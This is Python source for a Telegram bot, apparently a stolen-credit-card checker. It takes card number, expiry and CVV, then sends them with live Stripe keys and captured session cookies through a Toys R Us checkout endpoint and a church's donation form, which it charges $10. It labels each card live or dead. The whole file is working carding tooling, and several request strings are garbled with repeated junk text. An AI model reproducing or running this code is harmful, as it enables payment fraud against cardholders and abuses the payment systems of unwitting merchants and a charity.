—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
𝐓𝐢𝐦𝐞:  {final-ini:0.2} (segund)
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk """)
        
        
    if "Your card has insufficient funds." in error2:
        await m3.edit_text(f""" 
<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ ᴀᴜᴛʜ</b>

𝐂𝐂: <code>{ccs}</code> 
𝐒𝐭𝐚𝐭𝐮𝐬: 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
𝐌𝐞𝐬𝐬𝐚𝐠𝐞: 𝐘𝐨𝐮𝐫 𝐜𝐚𝐫𝐝 𝐡𝐚𝐬 𝐢𝐧𝐬𝐮𝐟𝐟𝐢𝐜𝐢𝐞𝐧𝐭 𝐟𝐮𝐧𝐝𝐬.
—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
𝐁𝐢𝐧: {bn}|{brand}|{typ}|{lv}
𝐁𝐚𝐧𝐤: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
𝐓𝐢𝐦𝐞:  {final-ini:0.2} (segund)
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk """)
    
    if "Your card was declined." in error2:
        await m3.edit_text(f""" 
<b>𐎢 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ꜱᴛʀɪᴘᴇ ᴄʜᴀʀɢᴇᴅ ᴀᴜᴛʜ</b>

𝐂𝐂: <code>{ccs}</code> 
𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌
𝐌𝐞𝐬𝐬𝐚𝐠𝐞: {error2}
—————— 𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ——————
𝐁𝐢𝐧: {bn}|{brand}|{typ}|{lv}
𝐁𝐚𝐧𝐤: {bank}
𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
—————— 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 ——————
𝐓𝐢𝐦𝐞:  {final-ini:0.2} (segund)
𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: <a href="tg://user?id={ID}">{FIRST}</a>
𝐁𝐨𝐭 𝐁𝐲: @DiegoAkk """)



@iniciar.message_handler(commands=['pene'], commands_prefix=comand)  
async def pene(message: types.Message):
    contra = await message.reply("<b>ᴘʀᴏᴄᴇss: ❗ Comprobando acceso ❗</b>")
    time.sleep(1)
    user = message.from_user.id
    if user in admins :
        await contra.edit_text('Estas autorizado!')
    
    else:
        await contra.edit_text('❗ No tienes acceso para utilizar este comando. ❗ Contacta a @DarwinOficial.')
        return str;
    ini = time.perf_counter()
    ccs = message.text[len('/pene '):]   

    if not ccs:
        await contra.edit_text("❗ ERROR INGRESE BIEN LA TARJETA ❗")

    spli = ccs.split('|')
    cc = spli[0]
    mes = spli[1]
    ano = spli[2]
    cvv = spli[3]
    m1 = await contra.edit_text(f"<b>💳ᴄᴀʀᴅ: {ccs}\nᴘʀᴏᴄᴇss: [🔴]</b>")

    headers77 = {
    'accept': '*/*',
    'content-type': 'application/x-www-form-urlencoded',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
    }

    session = requests.session()

    apik = session.post("https://r.stripe.com/0", headers=headers77)

@iniciar.message_handler(commands= ["ab"], commands_prefix=comand)
async def chhk(message: types.Message):
    ini = time.perf_counter()
    ccs = message.text[len('/ab '):]

    if not ccs:
           await message.reply("ESTA INGRESAANDO MAL LA CCS")

    spli = ccs.split('|')
    cc = spli[0]
    mes = spli[1]
    ano = spli[2]
    cvv = spli[3]

    nombre = "juan manuel santos"
    mail = "manueljaunsantos@gmail.com"

    cookies = {
    'dwac_eb83b5445ceb01c63da9991926': '7h2StYocULNPzAkTEaYB2AyPBCp9gmUTr_o%3D|dw-only|||USD|false|US%2FEastern|true',
    'cqcid': 'acsGRQnukGKuoSAlTcFn2alPQF',
    'cquid': '||',
    'sid': '7h2StYocULNPzAkTEaYB2AyPBCp9gmUTr_o',
    'dwanonymous_b9304412fd308f62a1edbd377f59f3b6': 'acsGRQnukGKuoSAlTcFn2alPQF',
    '__cq_dnt': '0',
    'dw_dnt': '0',
    'dwsid': 'oXj5Dmlut4AgCY9VhakygkPqb5Ge8IIgwD-uwigFOl-tbTvoa7YOinwLSzK_BX0c1ofQ-ky97t2p3EeeIMm6Ig==',
    '_gid': 'GA1.2.1075257567.1663292859',
    '__cq_uuid': 'acsGRQnukGKuoSAlTcFn2alPQF',
    '_fbp': 'fb.1.1663292861278.672876947',
    '_pin_unauth': 'dWlkPU1EaGhORFU0WmpBdFlqRXhOUzAwTjJVM0xUZ3daRGt0TVRoaU5qTXlOalprTWpWaw',
    'BVBRANDID': 'e3ec22d3-c7ff-4204-9c6e-3b19a1959858',
    'BVBRANDSID': '10cb540e-b786-4d74-87f5-ca579606a640',
    '__stripe_mid': 'c1331236-3c34-452d-b1e5-dd84de0dd87a5ff119',
    '__stripe_sid': '32e98acc-3a46-4b4a-a908-f6f8ec519082760817',
    'BVImplmain_site': '19940',
    '__cq_bc': '%7B%22bdmt-ToysRUs%22%3A%5B%7B%22id%22%3A%2212871932%22%7D%2C%7B%22id%22%3A%2212894051%22%7D%2C%7B%22id%22%3A%2213220600%22%7D%5D%7D',
    'cookieconsent_status': 'dismiss',
    '_ga': 'GA1.2.1211159942.1663292858',
    '__cq_seg': '0~0.18!1~-0.39!2~-0.09!3~-0.16!4~0.24!5~-0.36!6~0.22!7~0.58!8~0.27!9~-0.37!f0~3~2!n0~3',
    '_derived_epik': 'dj0yJnU9RUpENk9KY0xoYUtlTUZGa3FIRlRtSDNVXzlaelhXRTImbj1qejh5UDVHVmZaWHlCSHlIOHBPVGhnJm09MSZ0PUFBQUFBR01qMW1FJnJtPTEmcnQ9QUFBQUFHTWoxbUU',
    '_ga_98G3HYFZT4': 'GS1.1.1663292857.1.1.1663293984.0.0.0',}

    headers = {
    'authority': 'www.toysrus.com',
    'accept': '*/*',
    'accept-language': 'es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    # Already added when you pass json=
    # 'content-type': 'application/json',
    # Requests sorts cookies= alphabetically
    # 'cookie': 'dwac_eb83b5445ceb01c63da9991926=7h2StYocULNPzAkTEaYB2AyPBCp9gmUTr_o%3D|dw-only|||USD|false|US%2FEastern|true; cqcid=acsGRQnukGKuoSAlTcFn2alPQF; cquid=||; sid=7h2StYocULNPzAkTEaYB2AyPBCp9gmUTr_o; dwanonymous_b9304412fd308f62a1edbd377f59f3b6=acsGRQnukGKuoSAlTcFn2alPQF; __cq_dnt=0; dw_dnt=0; dwsid=oXj5Dmlut4AgCY9VhakygkPqb5Ge8IIgwD-uwigFOl-tbTvoa7YOinwLSzK_BX0c1ofQ-ky97t2p3EeeIMm6Ig==; _gid=GA1.2.1075257567.1663292859; __cq_uuid=acsGRQnukGKuoSAlTcFn2alPQF; _fbp=fb.1.1663292861278.672876947; _pin_unauth=dWlkPU1EaGhORFU0WmpBdFlqRXhOUzAwTjJVM0xUZ3daRGt0TVRoaU5qTXlOalprTWpWaw; BVBRANDID=e3ec22d3-c7ff-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVb1e5-dd84de0dd87a5ff119; __stripe_sid=32e98acc-3a46-4b4a-a908-f6f8ec519082760817; BVImplmain_site=19940; __cq_bc=%7B%22bdmt-ToysRUs%22%3A%5B%7B%22id%22%3A%2212871932%22%7D%2C%7B%22id%22%3A%2212894051%22%7D%2C%7B%22id%22%3A%2213220600%22%7D%5D%7D; cookieconsent_status=dismiss; _ga=GA1.2.1211159942.1663292858; __cq_seg=0~0.18!1~-0.39!2~-0.09!3~-0.16!4~0.24!5~-0.36!6~0.22!7~0.58!8~0.27!9~-0.37!f0~3~2!n0~3; _derived_epik=dj0yJnU9RUpENk9KY0xoYUtlTUZGa3FIRlRtSDNVXzlaelhXRTImbj1qejh5UDVHVmZaWHlCSHlIOHBPVGhnJm09MSZ0PUFBQUFBR01qMW1FJnJtPTEmcnQ9QUFBQUFHTWoxbUU; _ga_98G3HYFZT4=GS1.1.1663292857.1.1.1663293984.0.0.0',
    'origin': 'https://www.toysrus.com',
    'referer': 'https://www.toysrus.com/on/demandware.store/Sites-ToysRUs-Site/en_US/Checkout-Begin?stage=payment',
    'sec-ch-ua': '"Microsoft Edge";v="105", " Not;A Brand";v="99", "Chromium";v="105"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.33',}

    json_data = {
    'paymentMethodType': 'card',
    'stripeCustomerRequired': True,
    'zoneId': 'default',
    'statementDescriptor': None,}

    response2 = requests.post('https://www.toysrus.com/on/demandware.store/Sites-ToysRUs-Site/en_US/__SYSTEM__SalesforcePayments-PreparePaymentIntent', cookies=cookies, headers=headers, json=json_data).json()
 
    CS = response2["clientSecret"]
    PI =CS.split('_sec')[0]
    #await message.reply(f"PI={PI}")


    #await message.reply(f"{CS}")


    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Microsoft Edge";v="105", " Not;A Brand";v="99", "Chromium";v="105"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.33',}

    data = f'setup_future_usage=off_session&payment_method_data[type]=card&payment_method_data[billing_details][address][line1]=strate+4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVstate]=NY&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][email]=testnici1%4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVphone]=4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVcard][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]=37ae7a60-ea56-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVpayment_method_data[sid]=32e98acc-3a46-4b4a-a908-f6f8ec519082760817&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fc58a815e4%3B+stripe-js-v3%2Fc58a815e4&payment_method_data[time_on_page]=107717&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51HbsUNBP9OQuEIrPQTov2wZCQlEOC0EniZrH71zXu970tAaLxliYcvffDyHgP3wO9xrKbrfY4TGDVgViEUjwQ4mL00oKOvo8WJ&_stripe_account=acct_1JNK02Pl154QSdJg&client_secret={CS}'

    response = requests.post(f'https://api.stripe.com/v1/payment_intents/{PI}/confirm', headers=headers, data=data).json()

    error = response["error"]
    codel = error["code"]
    messagea = error["message"]

    #await message.reply(f"{messagea}")
    if 'Your card has insufficient funds.' in messagea:
        await message.reply(f"""
<b>CVV LIVE ?
CC : <code>{ccs}</code>
Code : {codel}
Mensage : {messagea}</b>""")

    elif 'incorrect_cvc'in codel:
        await message.reply(f"""
<b>CCN LIVE ?
CC : <code>{ccs}</code>
Code : {codel}
Mensage : {messagea}</b>
    """)
    elif 'Your card does not support this type of purchase.' in messagea:
        await message.reply(f"""
<b>CC DEAD ?
CC : <code>{ccs}</code>
Code : {codel}
Mensage : {messagea}</b>""")


    elif 'Your card was declined.' in messagea:
        await message.reply(f"""
<b>CC DEAD ?
CC : <code>{ccs}</code>
Code : {codel}
Mensage : {messagea}</b>""")
    elif 'incorrect_number' in codel:
        await message.reply(f"""
<b>CC DEAD ?
CC : <code>{ccs}</code>
Code : {codel}
Mensage : {messagea}</b>""")
    elif 'invalid_cvc' in codel:
        await message.reply(f"""
<b>CC DEAD ?
CC : <code>{ccs}</code>
Code : {codel}
Mensage : {messagea}</b>""")


    else:
        await message.reply(f"""

<b>CC Live ?
CC : <code>{ccs}</code> 
Mensage : Aprovado</b>
""")

@iniciar.message_handler(commands=['ch'], commands_prefix=comand)
async def helpfstr(message: types.Message):
    ini = time.perf_counter()
    ccs = message.text[len('/ch '):]

    if not ccs:
           await message.reply("/ch cc|mm|aa")

    spli = ccs.split('|')
    cc = spli[0]
    mes = spli[1]
    ano = spli[2]
    cvv = spli[3]
    
    session = requests.session()
    s = session.post('https://m.stripe.com/6')
    r = s.json()
    guid = r['guid']
    muid = r['muid']
    sid = r['sid']

    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',}
    
    data = f'time_on_page=1002419&guid={guid}&muid={muid}&sid={sid}&key=pk_live_kkIOioqvMQs4lec76gX9Ap5R&payment_user_agent=stripe.js%2F78ef418&card[name]=manuel&card[number]={cc}&card[exp_month]={mes}&card[exp_year]={ano}&card[cvc]={cvv}'
    response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
    lol = response.json()   

    if 'incorrect_number' in response.text:
        code = lol['error']['code']
        await message.reply(f"""<b>
CC DEAD ❌

cc : <code>{ccs}</code>
Code : {code}
SMG : Your card number is incorrect.</b>
        """)
    else:
        token = response.json()['id']
        tad = response.json()
        card = tad['card']

        apis = requests.get(f"https://bins-su-ani.vercel.app/api/{cc}").json()

        result=apis['result']
        msg=apis['message']
        data=apis['data']
        vendor=data['vendor']
        bn=data['bin']
        typ=data['type']
        lv=data['level']
        bank=data['bank']
        country=data['country']
        countryinfo=data['countryInfo']
        name=countryinfo['name']
        emoji=countryinfo['emoji']
        cd=countryinfo['code']
        dialCode=countryinfo['dialCode']
        
        cookies = {
            '_ga': 'GA1.2.929401543.1672862249',
            '_gid': 'GA1.2.87629019.1672862249',
            '__stripe_mid': '69acdb33-9d90-4d0e-8f28-b349e1dcb39a22f74d',
            'pdb-sess': '389eaaf8b8b508f9de8414a8358a243e',
            '__stripe_sid': 'baf0cce0-c506-43e1-82ec-9f27052f8fda165981',}
            
            
        headers = {
            'authority': 'www.churchofgodpacoima.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'es-ES,es;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'cookie': '_ga=GA1.2.929401543.1672862249; _gid=GA1.2.87629019.1672862249; __stripe_mid=69acdb33-9d90-4d0e-8f28-b349e1dcb39a22f74d; pdb-sess=389eaaf8b8b508f9de8414a8358a243e; __stripe_sid=baf0cce0-c506-43e1-82ec-9f27052f8fda165981',
            'origin': 'https://www.churchofgodpacoima.com',
            'referer': 'https://www.churchofgodpacoima.com/donate/',
            'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',}
        data = {
            'action': 'wp_full_stripe_payment_charge',
            'formName': 'Donation',
            'fullstripe_name': 'manuel',
            'fullstripe_email': 'rexwairtwwkwk@gmail.com',
            'fullstripe_custom_input': 'thanks',
            'fullstripe_custom_amount': '10.00',
            'fullstripe_address_line1': 'stree  457',
            'fullstripe_address_line2': '',
            'fullstripe_address_city': 'NY',
            'fullstripe_address_state': 'Cesar',
            'fullstripe_address_zip': '100100',
            'stripeToken': [
                token,
                ],}
            
        response1 = requests.post('https://www.churchofgodpacoima.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data).json()
        
        msg = response1['msg']

        #await message.reply(msg)

        if 'Your card was declined.' in msg:
            await message.reply(f"""<b>
CC Dead ❌

cc : <code>{ccs}</code>
Status : Decline
msg : Your card was declined.
‗‗‗‗‗‗‗‗‗‗‗‗‗‗
Bin: {bn}
Data: {vendor} {typ} {lv}
BANK: {bank}
COUNTRY : {country} {name} {emoji} {cd}</b>
""")
        else:
            await message.reply(f"""<b>
CC Live ✅

cc : <code>{ccs}</code>
SMG : Aproved
‗‗‗‗‗‗‗‗‗‗‗‗‗‗
Bin: {bn}
Data: {vendor} {typ} {lv}
BANK: {bank}
COUNTRY : {country} {name} {emoji} {cd}

</b>""")

print("CODIGO EN LINEA")
logging.basicConfig(level=logging.INFO)

if __name__ == '__main__':
    executor.start_polling(iniciar, skip_updates=True)
    
